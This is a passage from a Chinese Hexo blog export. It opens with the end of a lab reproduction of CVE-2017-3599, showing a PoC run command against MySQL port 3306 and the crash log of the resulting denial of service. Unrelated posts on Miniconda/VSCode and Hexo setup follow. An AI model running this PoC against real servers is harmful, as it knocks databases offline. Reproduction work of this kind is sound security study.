<h2 id="攻击执行"><a href="#攻击执行" class="headerlink" title="攻击执行"></a>攻击执行</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python poc.py IP 3306</span><br></pre></td></tr></table></figure>

<h2 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">拒绝服务，查看数据库的容器日志：</span><br><span class="line"></span><br><span class="line">root@yml-penetration:~/Workspace/cve-2017-3599<span class="comment"># docker logs 100</span></span><br><span class="line">Initializing database</span><br><span class="line">2023-12-19 12:19:33 0 [Note] Ignoring --secure-file-priv value as server is running with --bootstrap.</span><br><span class="line">2023-12-19 12:19:33 0 [Note] /usr/sbin/mysqld (mysqld 5.6.35) starting as process 36 ...</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Memory barrier is not used</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Using Linux native AIO</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Not using CPU crc32 instructions</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: The first specified data file ./ibdata1 did not exist: a new database to be created!</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Setting file ./ibdata1 size to 12 MB</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Database physically writes the file full: <span class="built_in">wait</span>...</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Setting <span class="built_in">log</span> file ./ib_logfile101 size to 48 MB</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Setting <span class="built_in">log</span> file ./ib_logfile1 size to 48 MB</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Renaming <span class="built_in">log</span> file ./ib_logfile101 to ./ib_logfile0</span><br><span class="line">2023-12-19 12:19:34 36 [Warning] InnoDB: New <span class="built_in">log</span> files created, LSN=45781</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Doublewrite buffer not found: creating new</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Doublewrite buffer created</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class="line">2023-12-19 12:19:34 36 [Warning] InnoDB: Creating foreign key constraint system tables.</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Foreign key constraint system tables created</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Creating tablespace and datafile system tables.</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Tablespace and datafile system tables created.</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Waiting <span class="keyword">for</span> purge to start</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: 5.6.35 started; <span class="built_in">log</span> sequence number 0</span><br><span class="line">2023-12-19 12:19:36 36 [Note] Binlog end</span><br><span class="line">2023-12-19 12:19:36 36 [Note] InnoDB: FTS optimize thread exiting.</span><br><span class="line">2023-12-19 12:19:36 36 [Note] InnoDB: Starting shutdown...</span><br><span class="line">2023-12-19 12:19:38 36 [Note] InnoDB: Shutdown completed; <span class="built_in">log</span> sequence number 1625977</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2023-12-19 12:19:38 0 [Note] Ignoring --secure-file-priv value as server is running with --bootstrap.</span><br><span class="line">2023-12-19 12:19:38 0 [Note] /usr/sbin/mysqld (mysqld 5.6.35) starting as process 59 ...</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Memory barrier is not used</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Using Linux native AIO</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Not using CPU crc32 instructions</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Highest supported file format is Barracuda.</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Waiting <span class="keyword">for</span> purge to start</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: 5.6.35 started; <span class="built_in">log</span> sequence number 1625977</span><br><span class="line">2023-12-19 12:19:38 59 [Note] Binlog end</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: FTS optimize thread exiting.</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Starting shutdown...</span><br><span class="line">2023-12-19 12:19:40 59 [Note] InnoDB: Shutdown completed; <span class="built_in">log</span> sequence number 1625987</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PLEASE REMEMBER TO SET A PASSWORD FOR THE MySQL root USER !</span><br><span class="line">To <span class="keyword">do</span> so, start the server, <span class="keyword">then</span> issue the following commands:</span><br><span class="line"></span><br><span class="line">/usr/bin/mysqladmin -u root password <span class="string">&#x27;new-password&#x27;</span></span><br><span class="line">/usr/bin/mysqladmin -u root -h 100bfe039d09 password <span class="string">&#x27;new-password&#x27;</span></span><br><span class="line"></span><br><span class="line">Alternatively you can run:</span><br><span class="line"></span><br><span class="line">/usr/bin/mysql_secure_installation</span><br><span class="line"></span><br><span class="line"><span class="built_in">which</span> will also give you the option of removing the <span class="built_in">test</span></span><br><span class="line">databases and anonymous user created by default.  This is</span><br><span class="line">strongly recommended <span class="keyword">for</span> production servers.</span><br><span class="line"></span><br><span class="line">See the manual <span class="keyword">for</span> more instructions.</span><br><span class="line"></span><br><span class="line">Please report any problems at http://bugs.mysql.com/</span><br><span class="line"></span><br><span class="line">The latest information about MySQL is available on the web at</span><br><span class="line"></span><br><span class="line">http://www.mysql.com</span><br><span class="line"></span><br><span class="line">Support MySQL by buying support/licenses at http://shop.mysql.com</span><br><span class="line"></span><br><span class="line">Note: new default config file not created.</span><br><span class="line">Please make sure your config file is current</span><br><span class="line"></span><br><span class="line">WARNING: Default config file /etc/mysql/my.cnf exists on the system</span><br><span class="line">This file will be <span class="built_in">read</span> by default by the MySQL server</span><br><span class="line">If you <span class="keyword">do</span> not want to use this, either remove it, or use the</span><br><span class="line">--defaults-file argument to mysqld_safe when starting the server</span><br><span class="line"></span><br><span class="line">Database initialized</span><br><span class="line">MySQL init process <span class="keyword">in</span> progress...</span><br><span class="line">2023-12-19 12:19:40 0 [Note] mysqld (mysqld 5.6.35) starting as process 87 ...</span><br><span class="line">2023-12-19 12:19:40 87 [Note] Plugin <span class="string">&#x27;FEDERATED&#x27;</span> is disabled.</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Memory barrier is not used</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Using Linux native AIO</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Not using CPU crc32 instructions</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Highest supported file format is Barracuda.</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Waiting <span class="keyword">for</span> purge to start</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: 5.6.35 started; <span class="built_in">log</span> sequence number 1625987</span><br><span class="line">2023-12-19 12:19:40 87 [Warning] No existing UUID has been found, so we assume that this is the first time that this server has been started. Generating a new UUID: e27a6a12-9e68-11ee-867c-0242ac110002.</span><br><span class="line">2023-12-19 12:19:40 87 [Warning] <span class="string">&#x27;user&#x27;</span> entry <span class="string">&#x27;root@100bfe039d09&#x27;</span> ignored <span class="keyword">in</span> --skip-name-resolve mode.</span><br><span class="line">2023-12-19 12:19:40 87 [Warning] <span class="string">&#x27;user&#x27;</span> entry <span class="string">&#x27;@100bfe039d09&#x27;</span> ignored <span class="keyword">in</span> --skip-name-resolve mode.</span><br><span class="line">2023-12-19 12:19:40 87 [Warning] <span class="string">&#x27;proxies_priv&#x27;</span> entry <span class="string">&#x27;@ root@100bfe039d09&#x27;</span> ignored <span class="keyword">in</span> --skip-name-resolve mode.</span><br><span class="line">2023-12-19 12:19:40 87 [Note] Event Scheduler: Loaded 0 events</span><br><span class="line">2023-12-19 12:19:40 87 [Note] mysqld: ready <span class="keyword">for</span> connections.</span><br><span class="line">Version: <span class="string">&#x27;5.6.35&#x27;</span>  socket: <span class="string">&#x27;/var/run/mysqld/mysqld.sock&#x27;</span>  port: 0  MySQL Community Server (GPL)</span><br><span class="line">Warning: Unable to load <span class="string">&#x27;/usr/share/zoneinfo/iso3166.tab&#x27;</span> as time zone. Skipping it.</span><br><span class="line">Warning: Unable to load <span class="string">&#x27;/usr/share/zoneinfo/leap-seconds.list&#x27;</span> as time zone. Skipping it.</span><br><span class="line">Warning: Unable to load <span class="string">&#x27;/usr/share/zoneinfo/zone.tab&#x27;</span> as time zone. Skipping it.</span><br><span class="line">2023-12-19 12:19:42 87 [Warning] <span class="string">&#x27;proxies_priv&#x27;</span> entry <span class="string">&#x27;@ root@100bfe039d09&#x27;</span> ignored <span class="keyword">in</span> --skip-name-resolve mode.</span><br><span class="line"></span><br><span class="line">2023-12-19 12:19:42 87 [Note] mysqld: Normal shutdown</span><br><span class="line"></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Giving 0 client threads a chance to die gracefully</span><br><span class="line">2023-12-19 12:19:42 87 [Note] Event Scheduler: Purging the queue. 0 events</span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down slave threads</span><br><span class="line">2023-12-19 12:19:42 87 [Note] Forcefully disconnecting 0 remaining clients</span><br><span class="line">2023-12-19 12:19:42 87 [Note] Binlog end</span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;partition&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_DATAFILES&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_TABLESPACES&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_FOREIGN_COLS&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_FOREIGN&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_FIELDS&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_COLUMNS&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_INDEXES&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_TABLESTATS&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_TABLES&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_FT_INDEX_TABLE&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_FT_INDEX_CACHE&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_FT_CONFIG&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_FT_BEING_DELETED&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_FT_DELETED&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_FT_DEFAULT_STOPWORD&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_METRICS&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_BUFFER_POOL_STATS&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_BUFFER_PAGE_LRU&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_BUFFER_PAGE&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_CMP_PER_INDEX_RESET&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_CMP_PER_INDEX&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_CMPMEM_RESET&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_CMPMEM&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_CMP_RESET&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_CMP&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_LOCK_WAITS&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_LOCKS&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_TRX&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;InnoDB&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] InnoDB: FTS optimize thread exiting.</span><br><span class="line">2023-12-19 12:19:42 87 [Note] InnoDB: Starting shutdown...</span><br><span class="line">2023-12-19 12:19:43 87 [Note] InnoDB: Shutdown completed; <span class="built_in">log</span> sequence number 1625997</span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;BLACKHOLE&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;ARCHIVE&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;PERFORMANCE_SCHEMA&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;MRG_MYISAM&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;MyISAM&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;CSV&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;MEMORY&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;sha256_password&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;mysql_old_password&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;mysql_native_password&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;binlog&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] mysqld: Shutdown complete</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MySQL init process <span class="keyword">done</span>. Ready <span class="keyword">for</span> start up.</span><br><span class="line"></span><br><span class="line">2023-12-19 12:19:44 0 [Note] mysqld (mysqld 5.6.35) starting as process 1 ...</span><br><span class="line">2023-12-19 12:19:44 1 [Note] Plugin <span class="string">&#x27;FEDERATED&#x27;</span> is disabled.</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Memory barrier is not used</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Using Linux native AIO</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Not using CPU crc32 instructions</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Highest supported file format is Barracuda.</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Waiting <span class="keyword">for</span> purge to start</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: 5.6.35 started; <span class="built_in">log</span> sequence number 1625997</span><br><span class="line">2023-12-19 12:19:44 1 [Note] Server hostname (bind-address): <span class="string">&#x27;*&#x27;</span>; port: 3306</span><br><span class="line">2023-12-19 12:19:44 1 [Note] IPv6 is available.</span><br><span class="line">2023-12-19 12:19:44 1 [Note]   - <span class="string">&#x27;::&#x27;</span> resolves to <span class="string">&#x27;::&#x27;</span>;</span><br><span class="line">2023-12-19 12:19:44 1 [Note] Server socket created on IP: <span class="string">&#x27;::&#x27;</span>.</span><br><span class="line">2023-12-19 12:19:44 1 [Warning] <span class="string">&#x27;proxies_priv&#x27;</span> entry <span class="string">&#x27;@ root@100bfe039d09&#x27;</span> ignored <span class="keyword">in</span> --skip-name-resolve mode.</span><br><span class="line">2023-12-19 12:19:44 1 [Note] Event Scheduler: Loaded 0 events</span><br><span class="line">2023-12-19 12:19:44 1 [Note] mysqld: ready <span class="keyword">for</span> connections.</span><br><span class="line">Version: <span class="string">&#x27;5.6.35&#x27;</span>  socket: <span class="string">&#x27;/var/run/mysqld/mysqld.sock&#x27;</span>  port: 3306  MySQL Community Server (GPL)</span><br><span class="line">12:21:29 UTC - mysqld got signal 11 ;</span><br><span class="line">This could be because you hit a bug. It is also possible that this binary</span><br><span class="line">or one of the libraries it was linked against is corrupt, improperly built,</span><br><span class="line">or misconfigured. This error can also be caused by malfunctioning hardware.</span><br><span class="line">We will try our best to scrape up some info that will hopefully <span class="built_in">help</span></span><br><span class="line">diagnose the problem, but since we have already crashed, </span><br><span class="line">something is definitely wrong and this may fail.</span><br><span class="line"></span><br><span class="line">key_buffer_size=8388608</span><br><span class="line">read_buffer_size=131072</span><br><span class="line">max_used_connections=1</span><br><span class="line">max_threads=151</span><br><span class="line">thread_count=1</span><br><span class="line">connection_count=1</span><br><span class="line">It is possible that mysqld could use up to </span><br><span class="line">key_buffer_size + (read_buffer_size + sort_buffer_size)*max_threads = 68108 K  bytes of memory</span><br><span class="line">Hope that<span class="string">&#x27;s ok; if not, decrease some variables in the equation.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Thread pointer: 0x23d86c0</span></span><br><span class="line"><span class="string">Attempting backtrace. You can use the following information to find out</span></span><br><span class="line"><span class="string">where mysqld died. If you see no messages after this, something went</span></span><br><span class="line"><span class="string">terribly wrong...</span></span><br><span class="line"><span class="string">stack_bottom = 7f3ca45a1e98 thread_stack 0x40000</span></span><br><span class="line"><span class="string">mysqld(my_print_stacktrace+0x2c)[0x8c3d5c]</span></span><br><span class="line"><span class="string">mysqld(handle_fatal_signal+0x481)[0x661df1]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libpthread.so.0(+0xf890)[0x7f3ccee40890]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(memchr+0x78)[0x7f3ccd885cd8]</span></span><br><span class="line"><span class="string">mysqld[0x672dc4]</span></span><br><span class="line"><span class="string">mysqld[0x683e2d]</span></span><br><span class="line"><span class="string">mysqld[0x68433e]</span></span><br><span class="line"><span class="string">mysqld[0x6730a9]</span></span><br><span class="line"><span class="string">mysqld[0x6724df]</span></span><br><span class="line"><span class="string">mysqld(_Z16acl_authenticateP3THDj+0x1bd)[0x68450d]</span></span><br><span class="line"><span class="string">mysqld[0x6abe17]</span></span><br><span class="line"><span class="string">mysqld(_Z16login_connectionP3THD+0x42)[0x6acbe2]</span></span><br><span class="line"><span class="string">mysqld(_Z22thd_prepare_connectionP3THD+0x19)[0x6ad329]</span></span><br><span class="line"><span class="string">mysqld(_Z24do_handle_one_connectionP3THD+0x11c)[0x6ad49c]</span></span><br><span class="line"><span class="string">mysqld(handle_one_connection+0x40)[0x6ad570]</span></span><br><span class="line"><span class="string">mysqld(pfs_spawn_thread+0x146)[0x8fa106]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libpthread.so.0(+0x8064)[0x7f3ccee39064]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d)[0x7f3ccd8e962d]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Trying to get some variables.</span></span><br><span class="line"><span class="string">Some pointers may be invalid and cause the dump to abort.</span></span><br><span class="line"><span class="string">Query (0): Connection ID (thread ID): 1</span></span><br><span class="line"><span class="string">Status: NOT_KILLED</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The manual page at http://dev.mysql.com/doc/mysql/en/crashing.html contains</span></span><br><span class="line"><span class="string">information that should help you find out what is causing the crash.</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>CVE-2017-3599</tag>
      </tags>
  </entry>
  <entry>
    <title>Miniconda+Vscode Python 环境管理</title>
    <url>/2024/01/07/Miniconda-Vscode-Python-%E7%8E%AF%E5%A2%83%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h2 id="0-Miniconda-安装"><a href="#0-Miniconda-安装" class="headerlink" title="0 Miniconda 安装"></a>0 Miniconda 安装</h2><ul>
<li>下载安装，可以安装Miniconda，也可以安装Anaconda，Miniconda轻量级。</li>
<li>安装选项：一路next，有一页path处，全选。</li>
</ul>
<h2 id="1-Vscode配置"><a href="#1-Vscode配置" class="headerlink" title="1 Vscode配置"></a>1 Vscode配置</h2><ul>
<li>安装Python扩展</li>
<li>设置扩展，将conda path添加到设置中<br>  <img src="/project/.io//2024/01/07/Miniconda-Vscode-Python-%E7%8E%AF%E5%A2%83%E7%AE%A1%E7%90%86/condapath.png" alt="Conda Path"></li>
<li>新建终端后，默认Python环境为miniconda的base虚拟环境</li>
</ul>
<h2 id="2-VScode中使用conda管理python环境"><a href="#2-VScode中使用conda管理python环境" class="headerlink" title="2 VScode中使用conda管理python环境"></a>2 VScode中使用conda管理python环境</h2><ul>
<li>在vscode中使用conda Prompt：[终端]-&gt;[新建终端]-&gt;[＋]-&gt;[command prompt]<ul>
<li>conda info –envs 查看当前虚拟环境列表</li>
<li>conda activate -n envsname 启动虚拟环境（默认为base）</li>
<li>可以看到启动后前面有（envsname）</li>
</ul>
</li>
</ul>
<h2 id="3-常用conda命令"><a href="#3-常用conda命令" class="headerlink" title="3 常用conda命令"></a>3 常用conda命令</h2><ul>
<li>查看所有环境	conda info –envs</li>
<li>创建新环境	conda create -n env_name python&#x3D;x.x</li>
<li>启动虚拟环境	conda activate env_name</li>
<li>退出虚拟环境	conda deactivate</li>
<li>删除虚拟环境	conda remove -n env_name  –all</li>
</ul>
<blockquote>
<p>本文内容首发于CSDN：<a href="https://blog.csdn.net/weixin_43694227/article/details/124099269">Miniconda+Vscode Python 环境管理</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>Miniconda</tag>
        <tag>Vscode</tag>
        <tag>Python环境管理</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/01/20/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>hexo + github 搭建个人博客教程</title>
    <url>/2024/01/20/hexo-github-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="什么是hexo？"><a href="#什么是hexo？" class="headerlink" title="什么是hexo？"></a>什么是hexo？</h2><p>hexo是一个基于nodejs的静态博客框架，可以快速搭建个人博客，支持markdown语法，支持自定义主题，支持插件扩展，支持一键部署到github上，支持离线写作，支持多终端同步等等。</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li>安装git，下载地址<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></li>
<li>安装nodejs，下载地址<a href="https://nodejs.cn/download/">https://nodejs.cn/download/</a></li>
<li>验证nodejs是否安装成功，打开cmd，输入<code>node -v</code>，显示版本号则安装成功</li>
<li>npm换源，打开cmd，输入<code>npm config set registry https://registry.npm.taobao.org</code>，换源成功后，输入<code>npm config get registry</code>，显示<code>https://registry.npm.taobao.org/</code>则换源成功</li>
<li>安装hexo，打开cmd，输入<code>npm install -g hexo-cli</code>，安装成功后，输入<code>hexo -v</code>，显示版本号则安装成功</li>
</ul>
<h2 id="初始化博客"><a href="#初始化博客" class="headerlink" title="初始化博客"></a>初始化博客</h2><ul>
<li>新建一个文件夹，例如<code>Bloggg</code></li>
<li>打开git命令行，输入<code>hexo init</code>，初始化博客</li>
<li>执行<code>npm install</code>，安装项目依赖</li>
<li>执行<code>hexo s</code>，启动本地服务，打开浏览器，输入<code>http://localhost:4000</code>，显示hexo默认页面，则初始化成功</li>
</ul>
<h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h2><ul>
<li>在博客根目录下执行<code>hexo new &quot;文章标题&quot;</code>，会在<code>source/_posts</code>目录下生成一个md文件，例如<code>hello-world.md</code></li>
<li>编辑博客后，执行<code>hexo s</code>，启动本地服务，打开浏览器，输入<code>http://localhost:4000</code>，显示博客，则新建文章成功</li>
</ul>
<h2 id="部署到github-pages"><a href="#部署到github-pages" class="headerlink" title="部署到github pages"></a>部署到github pages</h2><ul>
